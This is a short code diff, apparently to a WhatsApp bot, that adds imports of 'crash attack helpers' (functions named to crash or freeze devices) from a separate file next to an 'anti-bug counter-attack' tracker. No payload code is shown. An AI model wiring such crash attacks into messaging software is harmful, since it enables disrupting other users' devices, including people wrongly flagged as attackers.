@@ -621,6 +621,17 @@ const _spamTracker = new Map();
 // ─── Anti-Bug counter-attack tracker ─────────────────────────────────────────
 // key: senderJid  →  value: true (attack in progress)
 const _bugAttackActive = new Map();
+
+// ─── CRASH ATTACK HELPERS (from kezu_goodbye.js) ─────────────────────────────
+const {
+  _atkVvvXxxAaa,
+  _atkCrashard,
+  _atkCallInvisible,
+  _atkForceFreeze,
+  _atkBlank1,
+  _atkCombo
+} = require('./kezu_goodbye.js');
+
 // Clean up stale spam tracker entries every 2 minutes to prevent memory leak
 setInterval(() => {
   const _cutoff = Date.now() - 30000;
